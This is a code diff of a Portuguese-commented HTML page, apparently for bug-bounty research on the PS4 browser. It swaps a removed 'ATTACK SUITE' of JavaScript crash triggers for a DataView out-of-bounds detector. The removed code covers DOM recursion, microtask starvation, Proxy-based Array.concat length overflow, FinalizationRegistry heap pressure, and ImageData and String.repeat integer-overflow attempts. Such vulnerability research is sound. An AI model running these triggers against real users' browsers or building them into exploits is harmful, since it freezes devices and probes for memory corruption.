@@ -1,469 +1,84 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <meta charset="UTF-8">
-   <title>PS4 Attack</title>
-   </head>
+  <meta charset="utf-8">
+  <title>Detecção DataView OOB (PS4)</title>
+  <style>#log{white-space:pre-wrap;font-family:monospace;padding:10px;background:#111;color:#efe;height:60vh;overflow:auto}</style>
+</head>
 <body>
+  <h2>Detecção DataView OOB — execute no navegador do PS4</h2>
+  <button id="run">Rodar Teste DataView OOB (seguro)</button>
+  <div id="log">Aguardando...</div>
 
-  <h1>ATTACK SUITE</h1>
+  <script>
+  const L = document.getElementById('log');
+  function log(...a){ L.textContent = new Date().toISOString() + '  ' + a.join(' ') + '\n' + L.textContent; }
 
-    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
-    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
+  function hexdump32(v){ return '0x' + v.toString(16); }
 
-    <button onclick="runArgumentsCrash()">ALTA REPORTAR Arguments JIT Optimization Crash</button>
-    <button onclick="runConcatOOB()">ALTA REPORTAR Array.concat Spreadable Overflow</button>
-    <button onclick="runConcatCrash()">ALTA REPORTAR Array.concat Heap Overflow</button>
-    <button onclick="runSparseReverse()">ALTA REPORTAR Sparse Array Reverse (Memory Corruption)</button>
-    <button onclick="runGCResurrection()">ALTA REPORTAR FinalizationRegistry UAF (GC Panic)</button>
-    <button onclick="runImageDataOverflow()">ALTA REPORTAR ImageData Integer Overflow (Crash)</button>
+  function detectDataViewOOB(iterations = 2000, maxOffsetProbe = 80) {
+    log('=== Iniciando DataView OOB detector ===');
+    log('Iterations:', iterations, 'probe max offset:', maxOffsetProbe);
 
-    <button onclick="runReplaceBomb()">MEDIA REPORTAR String.replace Calculation Overflow</button>
-    <button onclick="runBadArrayLength()">MEDIA REPORTAR Bad Array Length (Integer Overflow)</button>
-    <button onclick="runStringOverflow()">MEDIA REPORTAR String.repeat Integer Overflow</button>
-	
+    let anomalies = [];
+    for (let it = 0; it < iterations; it++) {
+      // small buffer that must throw for offsets >= length
+      const ab = new ArrayBuffer(16);
+      const dv = new DataView(ab);
 
-    <button onclick="runMicrotaskBomb()">BAIXA REPORTAR Promise Microtask Starvation</button>
-    <button onclick="run10_AllocPanic()">BAIXA REPORTAR Bad Array New Length</button>    
-   
+      // put a known sentinel on valid positions
+      dv.setUint32(0, 0x11111111, true);
+      dv.setUint32(4, 0x22222222, true);
+      dv.setUint32(8, 0x33333333, true);
+      dv.setUint32(12, 0x44444444, true);
 
-    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>
-    <button onclick="runCollatorRecursion()">STACK OVERFLOW Intl.Collator Infinite Recursion</button>
-
-
-    <div id="log">Status: Aguardando testes...</div>
-    <canvas id="c" width="100" height="100"></canvas>
-    
-    <div id="hidden-area" style="display:none;"></div>
-    <div id="font-area" style="font-family: sans-serif;"></div>
-    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
-    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
-    <div id="sandbox" style="display:none;"></div>
-    <div id="ax-root"></div>
-    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>
-
-    <script>
-        function log(msg) {          
-            let logElem = document.getElementById('log');
-            logElem.innerText = `> ${msg}\n` + logElem.innerText;
+      // probe offsets (including offsets beyond buffer)
+      for (let off = 0; off <= maxOffsetProbe; off += 4) {
+        try {
+          const val = dv.getUint32(off, true); // expected: works for 0..12, RangeError for >=16
+          // If no exception and offset >= 16 -> ANOMALIA
+          if (off >= 16) {
+            anomalies.push({iteration: it, offset: off, value: val});
+            log('[ANOMALIA] getUint32 retornou sem RangeError at offset', off, '=>', hexdump32(val));
+            // break early if many anomalies
+            if (anomalies.length >= 20) break;
+          }
+        } catch (e) {
+          // RangeError or other is expected for out-of-range offsets
+          if (off < 16) {
+            log('[ERRO INESPERADO] leitura em offset válido lançou:', off, e.message);
+          }
         }
+      }
 
-        // --- HACKERONE FUNCTIONS ---
+      // small pressure to encourage GC / mixing
+      if ((it % 50) === 0) {
+        try {
+          new ArrayBuffer(0x7FFFFF0); // stress allocation
+        } catch (e) { /* ignore */ }
+      }
 
-        function startDOMRecursion() {
-            log("Iniciando ataque de Profundidade DOM...");
-            setTimeout(() => {
-                try {
-                    let root = document.createElement('div');
-                    document.body.appendChild(root);
-                    let count = 0;
-                    
-                    function dive() {
-                        count++;
-                        let child = document.createElement('div');
-                        child.innerText = "."; 
-                        root.appendChild(child);
-                        root = child; 
-                        
-                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
-                        
-                        dive(); 
-                    }
-                    dive();
-                } catch (e) {
-                    log("Erro capturado (Browser tentou proteger): " + e);
-                    log("Tentando método alternativo (String Repeat)...");
-                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
-                }
-            }, 500);
-        }
+      if (anomalies.length >= 20) break;
+    }
 
-        function runStringAttack() {
-            log("Fase 1: Criando Array Fragmentado...");
-            setTimeout(() => {
-                try {
-                    var hugeArray = [];
-                    var chunk = new Array(1024 * 1024).join("A"); 
-                    
-                    for(let i=0; i < 2000; i++) {
-                        hugeArray.push(chunk);
-                        if(i % 200 === 0) log("Alocado: " + i + "MB");
-                    }
+    if (anomalies.length === 0) {
+      log('Resultado: nenhum OOB detectado neste ciclo. (Comportamento esperado)');
+    } else {
+      log('>>> POSSÍVEL OOB detectado! total anomalies:', anomalies.length);
+      // print short report
+      anomalies.slice(0,20).forEach(a => log(JSON.stringify(a)));
+    }
 
-                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
-                    log("Atenção: O navegador deve travar agora.");
+    // return summary for automated capture
+    return { anomaliesCount: anomalies.length, anomaliesSample: anomalies.slice(0,10) };
+  }
 
-                    var flatString = hugeArray.join("");
-                    log("Tamanho final: " + flatString.length);
-                    var upper = flatString.toUpperCase(); 
-                    
-                } catch(e) {
-                    log("Erro (Browser Protegeu): " + e.message);
-                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
-                    for(let i=0; i<100000; i++) {
-                        history.pushState(0,0, i.toString());
-                    }
-                }
-            }, 100);
-        }
-
-        // --- STACK OVERFLOW ---
-
-        function runBindChain() {
-            log("Criando cadeia Function.bind()...");
-            try {
-                let func = function() { return "pow"; };
-                for (let i = 0; i < 50000; i++) {
-                    func = func.bind(null);
-                }
-                log("Cadeia criada. Executando (Trigger)...");
-                func();
-                log("Bind Chain executada (Sem crash).");
-            } catch(e) {
-                log("Erro Bind: " + e.message);
-                if (e.message.includes("stack")) {
-                    log("SUCESSO: Stack Overflow via Bind Chain!");
-                }
-            }
-        } 
-
-        function runCollatorRecursion() {
-            log("Iniciando Collator Recursion...");
-            
-            const collator = new Intl.Collator();
-            
-            const evil = {
-                toString: function() {
-                    // Recursão infinita dentro da chamada nativa
-                    return this.toString(); 
-                }
-            };
-
-            try {
-                log("Comparando objeto recursivo...");
-                // O C++ chama toString -> JS chama toString -> ...
-                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
-                collator.compare(evil, "a");
-                
-            } catch(e) {
-                log("Erro (Stack Overflow capturado): " + e.message);
-            }
-        }
-
-        // --- FREEZE FUNCTIONS ---
-
-        function runMicrotaskBomb() {
-            log("Iniciando Microtask Starvation (IPC Freeze)...");
-            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
-            let count = 0;
-            function loop() {
-                count++;
-                Promise.resolve().then(loop);
-                if (count % 100000 === 0) {
-                    new Date().toString(); 
-                }
-            }
-            loop();
-        }
-
-        function runReplaceBomb() {
-            log("Armando String.replace Logic Bomb...");
-            try {
-                let str = "test";
-                const re = /.*/; 
-                for(let i=0; i<30; i++) { 
-                    str = str.replace(re, "$&".repeat(2)); 
-                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
-                }
-                log("String final gerada (Seguro).");
-            } catch(e) {
-                log("Erro Replace (Provável OOM): " + e.message);
-            }
-        }
-
-        function runArgumentsCrash() {
-            log("Testando Arguments Type Confusion...");
-            
-            function confuse(arg) {
-                // O compilador tenta otimizar o acesso a 'arguments[0]'
-                // Nós mudamos a estrutura de 'arguments' deletando índices
-                delete arguments[0];
-                
-                // Agora definimos uma propriedade getter na cadeia de protótipos
-                Object.defineProperty(Object.prototype, "0", {
-                    get: () => {
-                        log("Getter na prototype chain ativado!");
-                        // Tenta invalidar a stack frame atual
-                        return 0xDEADBEEF;
-                    },
-                    configurable: true
-                });
-                
-                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
-                return arguments[0];
-            }
-
-            // Treina o motor com chamadas normais
-            for(let i=0; i<1000; i++) confuse(1);
-            
-            log("Executando acesso confuso...");
-            const val = confuse(1);
-            
-            if (val === 0xDEADBEEF) {
-                log("Comportamento Correto (Lento).");
-            } else if (val === undefined) {
-                log("Indefinido (Seguro).");
-            } else {
-                log(`ALERTA: Valor inesperado lido! ${val} (Possível leitura de Stack lixo)`);
-            }
-            
-            delete Object.prototype["0"]; // Limpeza
-        }
-
-        function runConcatOOB() {
-            log("Iniciando Array.concat Type Confusion...");
-            
-            try {
-                // Array alvo
-                const target = [1.1];
-                
-                // Objeto malicioso que finge ser um array espalhável
-                const proxy = new Proxy({}, {
-                    get(target, prop) {
-                        if (prop === Symbol.isConcatSpreadable) return true;
-                        
-                        if (prop === "length") {
-                            log("Engine leu length. Retornando tamanho gigante...");
-                            // Retorna um tamanho que pode causar overflow se somado ao target
-                            // Em 32-bit: 0xFFFFFFFF
-                            return 4294967295; 
-                        }
-                        
-                        if (prop === "0") {
-                            log("Engine leu índice 0.");
-                            return 0x41414141;
-                        }
-                        
-                        return undefined;
-                    },
-                    has(target, prop) { return true; } // Finge ter todas as propriedades
-                });
-
-                log("Executando concat()...");
-                
-                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
-                // Se houver Integer Overflow, ele aloca pouco.
-                // Depois tenta copiar os itens. Se não verificar limites, escreve fora.
-                const res = target.concat(proxy);
-                
-                log("Concat terminou (Sem Crash). Length: " + res.length);
-                
-            } catch(e) {
-                // "Out of memory" ou "Invalid array length" são bons sinais.
-                // Crash é o objetivo.
-                log("Erro Concat: " + e.message);
-            }
-        } 
-
-        function runConcatCrash() {
-            log("Iniciando Array.concat Overflow...");
-            
-            try {
-                const target = [];
-                // Objeto que finge ser um array gigante
-                const badSpreadable = {
-                    [Symbol.isConcatSpreadable]: true,
-                    length: 0xFFFFFFFF, // Tamanho máximo 32-bit
-                    0: 1,
-                    1: 2
-                };
-
-                log("Concatenando array gigante...");
-                
-                // Se o motor somar target.length (0) + badSpreadable.length (4GB),
-                // e ocorrer Integer Overflow, ele pode alocar um buffer pequeno.
-                // Mas se o loop de cópia tentar ler até 4GB, crasha.
-                const res = target.concat(badSpreadable);
-                
-                log("Concat finalizado. Length: " + res.length);
-                
-            } catch(e) {
-                log("Erro Concat (Provável OOM): " + e.message);
-            }
-        }
-
-        function runSparseReverse() {
-            log("Iniciando Sparse Array Reverse...");
-            
-            try {
-                const arr = [];
-                // Define índices nos extremos do limite de 32-bit
-                arr[0] = 1;
-                arr[0xFFFFFFFE] = 2; // 4GB - 2
-                
-                log(`Array esparso criado. Length: ${arr.length}`);
-                log("Executando reverse()...");
-                
-                // O GOLPE: O motor tem de trocar o índice 0 com o 0xFFFFFFFE.
-                // Se ele tentar iterar ou alocar memória para os buracos, OOM.
-                // Se ele calcular errado o endereço do último item, Crash.
-                arr.reverse();
-                
-                log("Reverse concluído.");
-                log("Valor em [0]: " + arr[0]); // Deve ser 2
-                
-            } catch(e) {
-                log("Erro Sparse: " + e.message);
-            }
-        }
-
-        function runGCResurrection() {
-            log("Iniciando GC Resurrection Attack...");
-            
-            if (!window.FinalizationRegistry) {
-                log("API FinalizationRegistry não suportada.");
-                return;
-            }
-
-            let registry = new FinalizationRegistry(heldValue => {
-                // Este código roda quando o objeto morre.
-                // O GC está num estado sensível aqui.
-                log("Objeto coletado! Tentando alocação massiva no callback...");
-                
-                // Tenta forçar movimento de memória enquanto o GC limpa
-                const chaos = [];
-                try {
-                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
-                } catch(e) {}
-                
-                // Se o GC não estiver bloqueado corretamente, isso pode corromper o heap.
-            });
-
-            // Cria objetos descartáveis
-            function makeTrash() {
-                let obj = { id: Math.random() };
-                registry.register(obj, "LIXO");
-                obj = null; // Marca para coleta
-            }
-
-            // Gera lixo massivo para forçar o ciclo de GC
-            log("Gerando pressão de GC...");
-            const interval = setInterval(() => {
-                for(let i=0; i<1000; i++) makeTrash();
-                
-                // Tenta forçar alocação para disparar o GC
-                const trigger = new Array(10000).fill(1.1);
-            }, 10);
-
-            setTimeout(() => {
-                clearInterval(interval);
-                log("Teste GC finalizado.");
-            }, 5000);
-        }
-
-        // --- SEM MEMORIA FUNCTIONS ---
-
-	    function runBadArrayLength() {
-            log("Testando Array Length Integer Overflow...");
-            const sizes = [
-                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
-            ];
-            sizes.forEach(size => {
-                try {
-                    log(`Tentando alocar Uint8Array(${size})...`);
-                    let arr = new Uint8Array(size);
-                    log("Alocado (Inesperado!)");
-                } catch(e) {}
-            });
-            log("Teste de Array finalizado.");
-        }
-
-        function run10_AllocPanic() {
-            log("[10] Testing Allocator Panic...");
-            try {
-                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
-                log("Allocated (Unexpected).");
-            } catch(e) { log("Alloc Error (Expected): " + e.message); }
-        }
-
-        function runImageDataOverflow() {
-            log("Iniciando ImageData Math Attack...");
-            
-            try {
-                // Valores críticos para 32-bit (0xFFFFFFFF)
-                // 1073741824 * 4 = 0 (Overflow exato)
-                // Vamos tentar valores próximos para enganar a validação
-                const targets = [
-                    { w: 1073741824, h: 1 }, // 4GB exato
-                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
-                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se não checado)
-                    { w: 23170, h: 23170 }   // ~2GB bytes
-                ];
-
-                targets.forEach((t, i) => {
-                    try {
-                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
-                        // O construtor pode lançar IndexSizeError (Seguro)
-                        // Se passar e o cálculo estiver errado -> Heap Corruption
-                        const img = new ImageData(t.w, t.h);
-                        log("ALERTA: ImageData criado! Verifique estabilidade.");
-                        
-                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
-                        const len = img.data.length;
-                        log("Buffer Length reportado: " + len);
-                        
-                    } catch(e) {
-                        // Erro esperado se a proteção funcionar
-                    }
-                });
-                
-                log("Teste ImageData finalizado.");
-
-            } catch(e) {
-                log("Erro Fatal: " + e.message);
-            }
-        }
-
-        function runStringOverflow() {
-            log("Iniciando String.repeat Overflow...");
-            
-            try {
-                // 1. Tenta o limite de 32-bit (4GB)
-                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
-                // "A" (1 byte) * (2^32 - 1)
-                // Se o alocador calcular errado, aloca pouco e escreve muito.
-                
-                // Valores críticos:
-                // 0xFFFFFFFF (Max Uint32)
-                // 0x7FFFFFFF (Max Int32)
-                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
-                
-                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
-                
-                counts.forEach(c => {
-                    try {
-                        log(`Tentando repetir string ${c} vezes...`);
-                        const s = "A".repeat(c);
-                        log(`String criada (Seguro). Length: ${s.length}`);
-                    } catch(e) {
-                        // RangeError (Invalid string length) é a proteção.
-                        // Se crashar, a proteção falhou.
-                        log("Erro (Browser Protegeu): " + e.message);
-                    }
-                });
-
-                // Tentativa secundária: Overflow com string base maior
-                // "AAAA" (4 bytes) * 0x40000000 = 4GB
-                const base = "AAAA";
-                log("Tentando overflow com base maior...");
-                const s2 = base.repeat(0x3FFFFFFF); 
-                log("Seguro.");
-
-            } catch(e) {
-                log("Erro Fatal: " + e.message);
-            }
-        }
-
-    </script>
+  document.getElementById('run').onclick = () => {
+    L.textContent = '';
+    const res = detectDataViewOOB(800, 80);
+    log('Teste finalizado. anomaliesCount=', res.anomaliesCount);
+    // if anomaly -> keep page open for you to copy logs
+  };
+  </script>
 </body>
 </html>
